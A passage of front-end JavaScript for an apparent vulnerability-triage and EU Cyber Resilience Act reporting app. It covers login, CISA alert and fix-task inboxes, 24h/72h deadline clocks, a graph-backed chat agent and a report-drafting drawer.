    if (k) el.classList.remove('on');
  });
  $('dtl').innerHTML = CASES.map((c, i) => `<button class="${i === CUR ? 'cur' : ''}" data-go="${i}" aria-label="${esc(c.name)}" title="${esc(c.name)} (${esc(c.date.slice(0, 4))})"></button>`).join('');
  $('dtl').querySelectorAll('[data-go]').forEach((b) => b.onclick = () => go(+b.dataset.go));
  $('caselist').querySelectorAll('[data-go]').forEach((b) => b.classList.toggle('text-fg', +b.dataset.go === CUR));
}
function go(i, dir = 0) {
  const n = CASES.length, top = $('deck').querySelector(`.sc[data-i="${CUR}"]`);
  if (dir && top) {                                     // fling the current card off, then restack
    top.style.transform = `translate(${dir * 480}px, 40px) rotate(${dir * 24}deg)`; top.style.opacity = '0';
    setTimeout(() => { CUR = (i + n) % n; layoutDeck(); }, 180);
  } else { CUR = (i + n) % n; layoutDeck(); }
}
function wireDeck() {
  const deck = $('deck');
  let x0 = 0, y0 = 0, dx = 0, el = null, moved = false;
  deck.addEventListener('pointerdown', (e) => {
    if (e.target.closest('button,a')) return;
    el = deck.querySelector(`.sc[data-i="${CUR}"]`); if (!el) return;
    x0 = e.clientX; y0 = e.clientY; dx = 0; moved = false;
    el.classList.add('drag'); deck.setPointerCapture(e.pointerId);
  });
  deck.addEventListener('pointermove', (e) => {
    if (!el) return;
    dx = e.clientX - x0;
    if (Math.abs(dx) > 6 || Math.abs(e.clientY - y0) > 6) moved = true;
    el.style.transform = `translateX(${dx}px) rotate(${dx / 18}deg)`;
    el.querySelector('[data-stamp="next"]').style.opacity = String(Math.min(1, Math.max(0, -dx / 90)));
    el.querySelector('[data-stamp="prev"]').style.opacity = String(Math.min(1, Math.max(0, dx / 90)));
  });
  const end = () => {
    if (!el) return;
    el.classList.remove('drag');
    el.querySelectorAll('.stamp').forEach((s) => s.style.opacity = '0');
    if (Math.abs(dx) > 90) go(dx < 0 ? CUR + 1 : CUR - 1, dx < 0 ? -1 : 1);
    else { if (!moved) el.classList.toggle('on'); layoutDeck(); }
    el = null;
  };
  deck.addEventListener('pointerup', end); deck.addEventListener('pointercancel', end);
  deck.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowRight') go(CUR + 1, -1);
    else if (e.key === 'ArrowLeft') go(CUR - 1, 1);
    else if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); deck.querySelector(`.sc[data-i="${CUR}"]`)?.classList.toggle('on'); }
  });
  $('dnext').onclick = () => go(CUR + 1, -1);
  $('dprev').onclick = () => go(CUR - 1, 1);
}
function wireReplay(root) {
  root.querySelectorAll('[data-replay]').forEach((b) => b.onclick = (e) => {
    e.stopPropagation();
    store.set('pending', `Are we affected by ${CASES[b.dataset.replay].cves[0]}?`);
    login('Mei Tanaka');
  });
}
async function loadCases() {
  try { CASES = await (await fetch('/api/cases')).json(); } catch { return; }
  if (!CASES.length) return;
  CASES.sort((a, b) => a.date.localeCompare(b.date));    // oldest first: a story from 2021 to 2025
  $('deck').innerHTML = CASES.map(caseCard).join('');
  $('caselist').innerHTML = CASES.map((c, i) => {
    const [col] = outcome(c);
    return `<button data-go="${i}" class="text-left text-muted hover:text-fg py-1 flex items-center gap-2 truncate"><span class="dot" style="background:${col}"></span>
      <span class="font-mono text-[11px] text-faint">${esc(c.date.slice(0, 4))}</span><span class="truncate">${esc(c.name)}</span></button>`;
  }).join('');
  $('caselist').querySelectorAll('[data-go]').forEach((b) => b.onclick = () => go(+b.dataset.go));
  wireDeck(); wireReplay($('deck'));
  $('deck').querySelectorAll('[data-more]').forEach((b) => b.onclick = (e) => {
    e.stopPropagation();
    const back = b.closest('.sf'); back.querySelector('[data-sum]').classList.toggle('hidden'); back.querySelector('[data-det]').classList.toggle('hidden');
  });
  go(Math.max(0, CASES.findIndex((c) => c.id === 'libwebp')));
  $('cases').classList.remove('hidden'); $('caselink').classList.remove('hidden');
}

async function login(name) {
  const r = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name }) });
  if (!r.ok) return toast('Sign-in failed');
  const { token, user } = await r.json();
  store.set('token', token);
  enter(user, true);
}
function logout() { store.set('token', null); USER = null; LAST_OPEN_TASKS = null; TASKS = { tasks: [], open: 0 }; closeDrawer(); closePanel(); $('chippop').classList.add('hidden'); endTour(); showLogin(); }

function enter(user, fresh) {
  USER = user;
  $('login').classList.add('hidden'); $('app').classList.remove('hidden');
  $('logo-small').innerHTML = logo(20);
  const psirt = isPsirt(user);
  $('me').innerHTML = `${avatar(user.name, 30)}
    <div class="hidden sm:block leading-tight"><div class="text-sm font-medium">${esc(user.name)}</div>
      <div class="text-[11px]" style="color:${psirt ? 'var(--violet)' : 'var(--cyan)'}">${roleLabel(user)}${psirt ? '' : ` · ${esc(user.team)}`}</div></div>
    <button id="switch" class="btn !rounded-full ml-1" title="Sign in as someone else on the same incident">Switch</button>`;
  $('switch').onclick = logout;
  $('inboxbtn').classList.toggle('hidden', !(may('investigate') || may('view_audit')));
  const readOnly = !may('investigate');
  $('input').disabled = readOnly; $('send').disabled = readOnly;
  $('input').placeholder = readOnly ? 'Read-only access · open Inbox or Incident' : 'e.g. Are we affected by CVE-2023-4863?';
  setIncident(INCIDENT);
  resetChat();
  if (graphReady) requestAnimationFrame(() => resetMap());
  if (fresh) toast(`Signed in as <b>${esc(user.name)}</b>`);
  const pending = store.get('pending'); store.set('pending', null);
  refreshAlerts(); refreshTasks();
  restoreHistory().then(() => { if (pending && may('investigate')) ask(pending); });
  if (!store.get('toured') && !pending) setTimeout(() => startTour(), 700);
  $('input').focus();
}

// conversation memory: your own turns on this incident, from the graph
async function restoreHistory() {
  let turns = [];
  try { turns = await api('/api/history/' + encodeURIComponent(INCIDENT)); } catch { return; }
  if (!turns.length || ANSWERS.length) return;
  $('empty')?.remove();
  const note = document.createElement('div');
  note.className = 'text-center text-[11px] text-faint';
  note.textContent = 'Earlier in this incident';
  $('log').appendChild(note);
  turns.forEach((t) => {
    if (t.role === 'user') { addUser(t.text); ASKED.add(t.text); return; }
    const el = document.createElement('div');
    el.className = 'fade-in opacity-80';
    el.innerHTML = `<div class="md">${md(t.text)}</div><div class="text-[10px] text-faint mt-1">${timeOf(t.ts)}</div>`;
    $('log').appendChild(el);
  });
  $('log').scrollTop = $('log').scrollHeight;
  renderChips();
}

// handoffs: fix tasks assigned to me
let TASKS = { tasks: [], open: 0 };
async function refreshTasks() {
  if (!may('investigate')) return;
  try { TASKS = await api('/api/tasks'); } catch { return; }
  const open = TASKS.open || 0;
  if (LAST_OPEN_TASKS === null && open) toast(`🔔 You have ${plural(open, 'open fix task')} in your Inbox`, 4000);
  else if (LAST_OPEN_TASKS !== null && open > LAST_OPEN_TASKS) toast(`🔔 ${plural(open - LAST_OPEN_TASKS, 'new fix task')} assigned to you`, 4000);
  LAST_OPEN_TASKS = open;
  updateBadge();
}

// inbox: alerts the watcher agent left in the graph
let ALERTS = [];
async function refreshAlerts() {
  try { ALERTS = await api('/api/alerts'); } catch { ALERTS = []; }
  ALERTS.sort((a, b) => (a.status === 'new' ? 0 : 1) - (b.status === 'new' ? 0 : 1) || (b.eu - a.eu) || String(b.kev_added).localeCompare(String(a.kev_added)));
  updateBadge();
  if ($('signals')) $('signals').outerHTML = startHTML(), wireSignals($('log'));
  const typing = [...$('panel-body').querySelectorAll('input, textarea')].some((f) => f.value);
  if (!$('panel').classList.contains('hidden') && PANEL === 'inbox' && !typing) PANEL_SHOW?.();
}

// incident memory, CRA clock, report button state
let CLOCK = null, BOARD = null;
function setIncident(id) {
  INCIDENT = id; store.set('incident', id);
  $('incident').innerHTML = `<span class="dot" style="background:var(--amber)"></span>Incident <span class="font-mono">${esc(id)}</span><span class="text-faint">▾</span>`;
  BOARD = null; CLOCK = null; syncStates();
  refreshMemory();
}
$('incident').onclick = () => openIncident();
$('newinc').onclick = () => { setIncident(newIncidentId()); resetChat(); resetMap(); toast('New incident · clean slate'); };

function decision(v) {
  if (v.startsWith('CRA REPORTABLE')) return ['Must report', 'var(--red)'];
  if (v.startsWith('LIKELY OUT')) return ['Finance rules (DORA)', 'var(--amber)'];
  if (v.startsWith('NOT REPORTABLE UNDER')) return v.includes('not on any market') ? ['No EU report · not on sale yet', 'var(--cyan)'] : ['No EU report · sold outside EU', 'var(--cyan)'];
  return ['No report · no attacks yet', 'var(--cyan)'];
}
function decisionWhy(v) {
  if (v.startsWith('CRA REPORTABLE')) return 'Attackers are using this bug and the product is sold in the EU, so the CRA requires the 24h alert and the 72h report. It also needs fixing.';
  if (v.startsWith('LIKELY OUT')) return 'A service Fernwave runs, not a product it sells: the CRA doesn\'t apply, DORA does. Compliance assesses it, and it still needs fixing.';
  if (v.startsWith('NOT REPORTABLE UNDER')) return v.includes('not on any market')
    ? 'Not on sale yet, so there is nothing to report to the EU. Fix it before launch.'
    : 'No EU report, because it isn\'t sold in the EU. It is still vulnerable, so its customers elsewhere still need the fix.';
  return 'No known attacks yet, so no report. Fix it on the normal schedule.';
}
function reportableCves() {
  if (!BOARD) return [];
  return BOARD.investigated.filter((i) => i.exploited && BOARD.assessed.some((a) => a.cve === i.cve && a.verdict.startsWith('CRA REPORTABLE'))).map((i) => i.cve);
}
function filedFor(cve) {
  return Object.fromEntries((BOARD?.reports || []).filter((r) => r.cve === cve).map((r) => [r.stage, r]));
}
function pendingFor(cve) {
  return Object.fromEntries((BOARD?.pending_reports || []).filter((r) => r.cve === cve).map((r) => [r.stage, r]));
}

async function refreshMemory() {
  if (!USER) return;
  let b;
  try { b = await api('/api/incident/' + encodeURIComponent(INCIDENT)); } catch { return; }
  BOARD = b; CLOCK = b.clock;
  if (!$('panel').classList.contains('hidden') && PANEL === 'incident') PANEL_SHOW?.();
  syncStates();
}

// keeps every stateful control in sync
function syncStates() {
  const btn = $('reportbtn');
  const cves = reportableCves();
  const pending = cves.filter((c) => { const f = filedFor(c); return !f.early_warning || !f.notification; });
  btn.style.cssText = '';
  const awaiting = BOARD?.pending_reports || [];
  if (awaiting.length && may('send_report')) {
    btn.disabled = false;
    btn.innerHTML = `✍️ <span class="hidden sm:inline">Approve report (${awaiting.length})</span><span class="sm:hidden">Approve</span>`;
    btn.style.cssText = 'color:#111;border-color:transparent;background:var(--amber)';
    btn.title = 'A security analyst prepared a report that needs your approval';
  } else if (awaiting.length) {
    btn.disabled = false;
    btn.innerHTML = '⏳ <span class="hidden sm:inline">Awaiting approval</span><span class="sm:hidden">Waiting</span>';
    btn.style.cssText = 'color:var(--amber);border-color:rgba(255,181,71,.5)';
    btn.title = 'Prepared and waiting for the security lead to approve and send it';
  } else if (!cves.length) {
    btn.disabled = true; btn.innerHTML = '📝 <span class="hidden sm:inline">No report needed yet</span><span class="sm:hidden">Report</span>';
    btn.title = 'This button turns on when a product you sell in the EU must be reported';
  } else if (pending.length) {
    const f = filedFor(pending[0]);
    btn.disabled = false;
    const verb = may('send_report') ? 'Send' : may('prepare_report') ? 'Prepare' : 'View';
    btn.innerHTML = `📝 <span class="hidden sm:inline">${verb} ${f.early_warning ? '72h full report' : '24h first alert'}</span><span class="sm:hidden">Report</span>`;
    btn.style.cssText = 'color:#fff;border-color:transparent;background:linear-gradient(90deg,var(--violet),#6D5BD0)';
    btn.title = 'Open the report, already filled in from what the team found';
  } else {
    btn.disabled = false;
    btn.innerHTML = '✓ <span class="hidden sm:inline">Reports sent · view</span><span class="sm:hidden">Sent</span>';
    btn.style.cssText = 'color:var(--green);border-color:rgba(62,224,143,.45)';
    btn.title = 'The 24h and 72h reports are sent. The final report is due 14 days after the fix: open to send it.';
  }
  // In-chat "must report" bars follow the same state.
  document.querySelectorAll('[data-reportbar]').forEach((bar) => {
    const f = filedFor(bar.dataset.cve), names = bar.dataset.products;
    const pend = pendingFor(bar.dataset.cve);
    if (!f.early_warning && pend.early_warning) {
      bar.style.cssText = 'border-color:rgba(255,181,71,.4);background:rgba(255,181,71,.05)';
      bar.innerHTML = `<span class="text-amber font-medium">24h alert waiting for approval</span><span class="text-muted text-xs">prepared by ${esc(pend.early_warning.prepared_by)}</span>
        <button class="btn ml-auto" data-open="${esc(bar.dataset.cve)}">Open →</button>`;
    } else if (f.early_warning && f.notification) {
      bar.style.cssText = 'border-color:rgba(62,224,143,.4);background:rgba(62,224,143,.05)';
      bar.innerHTML = `<span class="text-green font-medium">✓ Reported to the EU</span><span class="text-muted text-xs">${esc(names)} · 24h and 72h reports sent by ${esc(f.notification.by)}</span>`;
    } else if (f.early_warning) {
      bar.style.cssText = 'border-color:rgba(255,181,71,.4);background:rgba(255,181,71,.05)';
      bar.innerHTML = `<span class="text-amber font-medium">24h alert sent ✓ · full report due</span><span class="text-muted text-xs">${esc(names)}</span>
        <button class="btn ml-auto" data-open="${esc(bar.dataset.cve)}">Continue →</button>`;
    } else {
      bar.style.cssText = 'border-color:rgba(255,84,112,.4);background:rgba(255,84,112,.05)';
      bar.innerHTML = `<span class="text-red font-medium">Must report to the EU within 24h</span><span class="text-muted text-xs">${esc(names)}</span>
        <button class="btn ml-auto" data-open="${esc(bar.dataset.cve)}" style="color:var(--violet);border-color:rgba(139,92,246,.5)">Open report →</button>`;
    }
    bar.querySelector('[data-open]')?.addEventListener('click', (e) => openDrawer(e.currentTarget.dataset.open));
  });
  // Alerts already checked are marked as such.
  document.querySelectorAll('[data-sig]').forEach((b) => {
    const done = (BOARD?.investigated || []).some((i) => i.cve === ALERTS[b.dataset.sig]?.cve);
    b.disabled = done || !may('investigate'); b.textContent = done ? '✓ Checked' : 'Check →';
    b.style.cssText = done ? 'color:var(--green);border-color:rgba(62,224,143,.35)' : 'color:var(--cyan);border-color:rgba(34,211,238,.35)';
  });
  renderChips();
}

function fmt(ms) {
  if (ms <= 0) return 'OVERDUE';
  const s = Math.floor(ms / 1000);
  return [Math.floor(s / 3600), Math.floor(s / 60) % 60, s % 60].map((n) => String(n).padStart(2, '0')).join(':') + ' left';
}
setInterval(() => {
  if (!CLOCK) {
    ['c24', 'c72'].forEach((id) => { $(id).textContent = 'not started'; $(id).style.color = ''; });
    $('b24').style.width = $('b72').style.width = '0';
    return;
  }
  const now = Date.now(), aware = new Date(CLOCK.aware).getTime();
  const filed = filedFor(CLOCK.cve);
  [['24', 24, 'early_warning'], ['72', 72, 'notification']].forEach(([k, h, stage]) => {
    if (filed[stage]) {
      $('c' + k).textContent = `✓ sent · ${dur(filed[stage].minutes_after_awareness)}`;
      $('c' + k).style.color = 'var(--green)'; $('b' + k).style.width = '100%'; $('b' + k).style.background = 'var(--green)';
      return;
    }
    const left = new Date(CLOCK['deadline_' + k + 'h']).getTime() - now;
    $('c' + k).textContent = fmt(left);
    $('c' + k).style.color = left < 3 * 3600e3 ? 'var(--red)' : k === '24' ? 'var(--amber)' : 'var(--violet)';
    $('b' + k).style.background = k === '24' ? 'var(--amber)' : 'var(--violet)';
    $('b' + k).style.width = Math.min(100, ((now - aware) / (h * 3600e3)) * 100).toFixed(2) + '%';
  });
}, 1000);

// chat
const FOLLOW = [
  { label: 'Assign the fixes', q: 'Assign the fixes to the on-call owners.', need: (c) => c.size > 0 && may('assign_tasks') },
  { label: 'Who fixes it?', q: 'Who do I wake up to fix it, and is there a runbook?', need: (c) => c.size > 0 },
  { label: 'What should we fix first?', q: 'What should we fix first?', need: () => true, start: true },
  { label: 'Who owns what?', q: 'How many teams do we have, who is in them, and which products do they own?', need: () => true, start: true },
  { label: "What's new on CISA's list?", q: "Anything new on CISA's exploited list this month?", need: () => true, start: true },
  { label: 'Fixed this before?', q: 'Have we dealt with Log4Shell (CVE-2021-44228) before? How did we fix it?', need: () => true },
  { label: 'Who knows Pillow?', q: 'Who knows Pillow?', need: () => true },
  { label: 'Why is KYC out of CRA scope?', q: 'Why is KYC Service out of CRA scope?', need: () => true },
  { label: 'Most critical parts?', q: 'What are our most critical parts?', need: () => true },
  { label: 'Tickets about Electron?', q: 'Any tickets or chat about Electron?', need: () => true },
  { label: 'MOVEit (supplier)?', q: 'Are we affected by CVE-2023-34362 (MOVEit)?', need: () => true },
  { label: 'What if we upgrade libwebp?', q: 'If we upgrade libwebp everywhere, are we safe?', need: (c) => c.has('CVE-2023-4863') },
  { label: 'Heartbleed on our terminals?', q: 'Is anything we sell still exposed to Heartbleed (CVE-2014-0160)?', need: () => true },
  { label: 'Log4Shell?', q: 'What about Log4Shell (CVE-2021-44228)? We use log4j.', need: () => true },
  { label: "What's wrong with FernPOS T2?", q: "What's wrong with FernPOS T2?", need: () => true },
  { label: "A bug we don't know", q: 'Are we affected by CVE-2026-31337?', need: () => true },
];
const ANSWERS = [], ASKED = new Set();
let BUSY = false;

// Counts on the Inbox button and on each of its tabs.
let LAST_OPEN_TASKS = null;
const pill = (n, col) => n ? `<span class="ml-1.5 inline-flex min-w-[18px] justify-center rounded-full px-1.5 text-[10px] font-mono font-semibold text-ink" style="background:${col}">${n}</span>` : '';
function updateBadge() {
  const alerts = ALERTS.filter((a) => a.status === 'new').length, tasks = TASKS.open || 0;
  $('inboxn').innerHTML = (alerts ? pill(`${alerts} new`, 'var(--amber)') : '') + (tasks ? pill(`${tasks} task${tasks === 1 ? '' : 's'}`, 'var(--cyan)') : '');
  $('inboxbtn').style.cssText = alerts || tasks ? 'border-color:rgba(255,181,71,.45)' : '';
  updateInboxTabs();
}
function updateInboxTabs() {
  if (PANEL !== 'inbox' || $('panel').classList.contains('hidden')) return;
  const counts = { 'Alerts': [ALERTS.filter((a) => a.status === 'new').length, 'var(--amber)'], 'My tasks': [TASKS.open || 0, 'var(--cyan)'] };
  $('panel-tabs').querySelectorAll('[data-tab]').forEach((b) => {
    const name = b.dataset.name || (b.dataset.name = b.textContent);
    b.innerHTML = esc(name) + pill(...(counts[name] || [0]));
  });
}
function signalsHTML(list = ALERTS) {
  if (!list.length) return `<div class="text-xs text-faint">No alerts. plexus checks CISA's list of exploited bugs against everything Fernwave ships every 15 minutes.</div>`;
  return list.map((a) => {
    const i = ALERTS.indexOf(a), sev = a.eu ? 'var(--red)' : 'var(--amber)';
    const state = a.status === 'new' ? '<span class="chip !text-[10px] !py-0 text-cyan" style="border-color:rgba(34,211,238,.4)">new</span>'
      : `<span class="text-[10px] text-faint">checked by ${esc(a.triaged_by || 'someone')}${a.incident ? ` · <span class="font-mono">${esc(a.incident)}</span>` : ''}</span>`;
    return `<div class="rounded-xl border hair bg-raised/60 p-3 flex items-start gap-3 ${a.status === 'new' ? '' : 'opacity-70'}">
      <span class="dot mt-1.5" style="background:${sev};box-shadow:0 0 8px ${sev}"></span>
      <div class="flex-1 min-w-0">
        <div class="text-[11px] text-faint flex items-center gap-2 flex-wrap">On CISA's exploited list since ${esc(a.kev_added || 'n/a')}${a.ransomware ? ' · <span class="text-red">ransomware</span>' : ''} ${state}</div>
        <div class="text-sm mt-0.5">${esc(a.title)}</div>
        <div class="text-[11px] text-faint mt-0.5"><span class="font-mono">${esc(a.cve)}</span> · reaches ${esc((a.products || []).join(', '))}</div></div>
      <button class="btn flex-none" data-sig="${i}">Check →</button>
    </div>`;
  }).join('');
}
// the empty chat shows the newest alert
function startHTML() {
  const fresh = ALERTS.filter((a) => a.status === 'new'), more = fresh.length - 1, tasks = TASKS.open || 0;
  const rest = [more > 0 ? plural(more, 'more new alert') : '', tasks ? plural(tasks, 'fix task') + ' for you' : ''].filter(Boolean).join(' and ');
  return `<div id="signals" class="max-w-xl">
    <h3 class="text-lg font-semibold">${USER ? `Hi ${esc(USER.name.split(' ')[0])}.` : 'Hi.'} ${fresh.length ? 'Start with the newest alert.' : 'Nothing new right now.'}</h3>
    ${fresh.length ? '' : '<p class="text-sm text-muted mt-1">Ask anything below, or open your Inbox.</p>'}
    ${fresh.length ? `<div class="mt-4">${signalsHTML(fresh.slice(0, 1))}</div>` : ''}
    ${rest ? `<button class="mt-3 text-sm text-cyan hover:underline" data-openinbox>${rest} in your Inbox →</button>` : ''}
  </div>`;
}
function wireSignals(root) {
  root.querySelectorAll('[data-sig]').forEach((b) => b.onclick = () => { closePanel(); ask(`Are we affected by ${ALERTS[b.dataset.sig].cve}?`); });
  root.querySelectorAll('[data-openinbox]').forEach((b) => b.onclick = () => openInbox(TASKS.open && !ALERTS.some((a) => a.status === 'new') ? 1 : 0));
  root.querySelectorAll('[data-scan]').forEach((b) => b.onclick = async () => {
    b.disabled = true;
    try { const r = await api('/api/watch', { method: 'POST' }); toast(r.new_alerts.length ? `Watcher found ${plural(r.new_alerts.length, 'new alert')}` : 'Watcher scan done · nothing new'); await refreshAlerts(); }
    catch (e) { toast(esc(e.message)); } finally { b.disabled = false; }
  });
  syncStates();
}
function resetChat() {
  ANSWERS.length = 0; ASKED.clear();
  $('log').innerHTML = `<div id="empty" class="fade-in">${startHTML()}</div>`;
  wireSignals($('log'));
}
function renderChips() {
  const cves = new Set((BOARD?.investigated || []).map((i) => i.cve));
  const list = !may('investigate') ? [] : FOLLOW.filter((f) => !ASKED.has(f.q) && f.need(cves) && (ANSWERS.length || f.start)).slice(0, 3);
  $('chips').innerHTML = list.map((f) => `<button class="flex-none chip text-muted hover:text-fg hover:border-faint" data-q="${esc(f.q)}">${esc(f.label)}</button>`).join('');
  $('chips').querySelectorAll('[data-q]').forEach((b) => b.onclick = () => ask(b.dataset.q));
}

function parsePath(s) {
  const re = /(<-\[:([A-Z_*]+)\]-|-\[:([A-Z_*]+)\]->)/g;
  const nodes = [], rels = []; let last = 0, m;
  while ((m = re.exec(s))) { nodes.push(s.slice(last, m.index)); rels.push({ type: m[2] || m[3], fwd: !!m[3] }); last = re.lastIndex; }
  nodes.push(s.slice(last));
  return { nodes: nodes.map((n) => n.trim().replace(/^\(/, '').replace(/\)$/, '')), rels };
}
const pretty = (id) => { const [label, ...rest] = id.split(':'); return { label, name: (rest.join(':') || label).replace('@', ' ') }; };
function chainHTML(path) {
  const { nodes } = parsePath(path);
  return `<span class="inline-flex flex-wrap items-center gap-1 align-middle">${nodes.map((n, i) => {
    const { label, name } = pretty(n);
    return `${i ? '<span class="text-faint text-xs">→</span>' : ''}<span class="node"><span class="dot" style="background:${COLOR[label] || '#8C93A8'}"></span>${esc(name)}</span>`;
  }).join('')}</span>`;
}
const STEP = {
  lookup_vulnerability: 'Looked up the bug', blast_radius: 'Traced it to your products', simulate_patch: 'Simulated the upgrade',
  product_context: 'Found the owners and runbooks', component_experts: 'Found who knows this part', recall_session: 'Checked what the team already found',
  draft_report_facts: 'Gathered the facts for the report', product_vulnerabilities: 'Listed everything that affects the product',
  fix_queue: 'Ranked every open vulnerability', kev_watch: "Checked CISA's latest additions", team_directory: 'Read the teams',
  who_knows: 'Ranked who knows it', decision_trace: 'Traced the decision to its source', search_knowledge: 'Searched tickets, chat and docs',
  critical_components: 'Ranked the most depended-on parts', connection: 'Found how they are connected', past_fixes: 'Recalled past fixes',
  create_fix_tasks: 'Assigned the fixes', my_tasks: 'Read your tasks',
};
const STATUS = { ok: ['done', 'var(--green)'], not_found: ['not in the data', 'var(--amber)'], ambiguous: ['needs you to pick one', 'var(--amber)'],
                 denied: ['not allowed for your role', 'var(--red)'], invalid: ['could not read the question', 'var(--amber)'], error: ['failed', 'var(--red)'] };
function proofHTML(trace) {
  return trace.map((t, i) => {
    const [label, col] = STATUS[t.status] || ['?', 'var(--faint)'];
    return `<div class="py-2.5 ${i ? 'border-t hair' : ''}">
      <div class="flex items-center gap-2 text-sm"><span style="color:${col}">●</span><span>${esc(STEP[t.tool] || t.tool)}</span>
        <span class="ml-auto text-[11px]" style="color:${col}">${label}</span></div>
      ${t.status !== 'ok' && t.message ? `<div class="text-xs mt-1 text-muted">${esc(t.message)}</div>` : ''}
      <div class="mt-1.5 space-y-1.5">${t.paths.slice(0, 3).map((p) => `<div>${chainHTML(p)}</div>`).join('')}</div>
      ${t.paths.length > 3 ? `<div class="text-[11px] text-faint mt-1">+${t.paths.length - 3} more</div>` : ''}
      ${(t.evidence || []).length ? `<div class="mt-1.5 text-[11px] text-faint">Sources: ${t.evidence.map(esc).join(' · ')}</div>` : ''}</div>`;
  }).join('');
}

function addUser(text) {
  $('empty')?.remove();
  const el = document.createElement('div');
  el.className = 'flex justify-end fade-in';
  el.innerHTML = `<div class="max-w-[85%] rounded-2xl rounded-br-md px-3.5 py-2 text-sm bg-raised border hair">${esc(text)}</div>`;
  $('log').appendChild(el);
}
function addPending() {
  const el = document.createElement('div');
  el.className = 'fade-in';
  el.innerHTML = `<div class="flex items-center gap-2 text-xs text-cyan">checking Fernwave's data<span class="typing flex gap-1"><span></span><span></span><span></span></span></div>`;
  $('log').appendChild(el);
  el.scrollIntoView({ block: 'end', behavior: 'smooth' });
  return el;
}

let GEMINI_OK = false;

function renderAnswer(el, i) {
  const d = ANSWERS[i];
  const okPaths = d.trace.filter((t) => t.status === 'ok').reduce((s, t) => s + t.paths.length, 0);
  const reportable = [...new Set(d.trace.flatMap((t) => t.reportable || []))];
  const cve = (d.trace.find((t) => (t.reportable || []).length)?.args?.cve_id || '').toUpperCase();
  const draft = d.trace.some((t) => t.tool === 'draft_report_facts' && t.status === 'ok');
  el.innerHTML = `
    <div class="md">${md(d.answer)}</div>
    ${reportable.length ? `<div data-reportbar data-cve="${esc(cve)}" data-products="${esc(reportable.join(', '))}" class="mt-3 rounded-xl border px-3 py-2 flex flex-wrap items-center gap-2 text-sm"></div>` : ''}
    <div class="mt-2.5 flex flex-wrap gap-1.5">
      ${d.trace.length ? `<button class="btn" data-a="proof">How we know</button>` : ''}
      ${draft ? `<button class="btn" data-a="export">⤓ Save draft</button>` : ''}
    </div>
    <div data-slot="proof" class="hidden mt-2 rounded-xl border hair bg-ink/40 px-3">${proofHTML(d.trace)}</div>`;
  // Suggested questions ("…" in italics) are clickable.
  el.querySelectorAll('.md em').forEach((m) => {
    const q = m.textContent.trim();
    if (!/^".+"$/.test(q) || !may('investigate')) return;
    m.className = 'not-italic text-cyan cursor-pointer hover:underline';
    m.onclick = () => ask(q.slice(1, -1));
  });
  // graph paths in the text become chips
  el.querySelectorAll('.md code').forEach((c) => { if (/-\[:[A-Z_]+\]/.test(c.textContent)) c.outerHTML = chainHTML(c.textContent); });
  const proofBtn = el.querySelector('[data-a="proof"]');
  proofBtn?.addEventListener('click', () => {
    const slot = el.querySelector('[data-slot="proof"]'), open = slot.classList.toggle('hidden') === false;
    proofBtn.textContent = open ? 'Hide' : 'How we know';
    if (open) showAnswer(d.trace);
  });
  el.querySelector('[data-a="export"]')?.addEventListener('click', () => {
    const c = (d.answer.match(/CVE-\d{4}-\d+/) || ['CVE'])[0];
    download(`report-draft-${c}-${INCIDENT}.md`, d.answer, 'text/markdown');
  });
  syncStates();
}
function download(name, text, type) {
  const a = Object.assign(document.createElement('a'), { href: URL.createObjectURL(new Blob([text], { type })), download: name });
  a.click(); URL.revokeObjectURL(a.href);
}


async function ask(text) {
  text = (text || '').trim();
  if (!text || BUSY) return;
  if (!may('investigate')) return toast('Read-only access: open Inbox or Incident');
  BUSY = true; $('send').disabled = true; $('input').value = ''; ASKED.add(text); renderChips();
  addUser(text);
  const el = addPending();
  try {
    const d = await api('/api/agent', { method: 'POST', body: JSON.stringify({ incident_id: INCIDENT, message: text, agent: GEMINI_OK ? 'gemini' : 'graph' }) });
    ANSWERS.push({ ...d, question: text });
    renderAnswer(el, ANSWERS.length - 1);
    try { showAnswer(d.trace); } catch (err) { console.warn('map animation failed', err); }
    await refreshMemory(); refreshAlerts(); refreshTasks();
  } catch (e) {
    el.innerHTML = `<div class="rounded-xl border px-3 py-2 text-sm" style="border-color:rgba(255,84,112,.4);color:#FFB3C0">${esc(e.message)}</div>`;
  } finally { BUSY = false; $('send').disabled = false; $('input').focus(); }
}
$('form').onsubmit = (e) => { e.preventDefault(); ask($('input').value); };

// report drawer: 24h first alert -> 72h full report -> final report
let REPORT = null, STAGE = 'early_warning';
const STAGE_ORDER = ['early_warning', 'notification', 'final_report'];
const STAGE_NAME = { early_warning: 'First alert', notification: 'Full report', final_report: 'Final report' };
const STAGE_WHEN = { early_warning: 'within 24 hours', notification: 'within 72 hours', final_report: '14 days after the fix' };

async function openDrawer(cve) {
  await refreshMemory();
  const cves = reportableCves();
  if (!cve && BOARD?.pending_reports?.length) cve = BOARD.pending_reports[0].cve;
  if (!cves.length) return toast('Nothing to report yet: no product sold in the EU is affected.');
  cve = cves.includes(cve) ? cve : cves[0];
  $('cvepick').innerHTML = cves.map((c) => `<option ${c === cve ? 'selected' : ''}>${esc(c)}</option>`).join('');
  $('cvepick').classList.toggle('hidden', cves.length < 2);
  $('drawer').classList.remove('hidden');
  loadReport(cve);
}
function closeDrawer() { $('drawer').classList.add('hidden'); }
$('reportbtn').onclick = () => openDrawer(CLOCK?.cve);
$('drawer-x').onclick = closeDrawer; $('drawer-bg').onclick = closeDrawer;
$('cvepick').onchange = (e) => loadReport(e.target.value);
document.addEventListener('keydown', (e) => { if (e.key === 'Escape') { closeDrawer(); closePanel(); endTour(); $('chippop').classList.add('hidden'); } });

async function loadReport(cve) {
  $('drawer-body').innerHTML = '<div class="text-sm text-muted">filling in from your team\'s findings…</div>';
  try { REPORT = await api(`/api/report/${encodeURIComponent(INCIDENT)}/${encodeURIComponent(cve)}`); }
  catch (e) { $('drawer-body').innerHTML = `<div class="text-sm text-red">${esc(e.message)}</div>`; return; }
  const done = new Set(REPORT.submitted.map((r) => r.stage));
  STAGE = STAGE_ORDER.find((s) => !done.has(s)) || 'final_report';
  renderReport();
}

function renderReport() {
  const R = REPORT, done = Object.fromEntries(R.submitted.map((r) => [r.stage, r]));
  const pend = Object.fromEntries((R.pending || []).map((r) => [r.stage, r]));
  const aware = new Date(R.awareness_time_utc), ew = done.early_warning;
  const elapsed = Math.floor((Date.now() - aware) / 60000);
  const tabs = STAGE_ORDER.map((s, i) => {
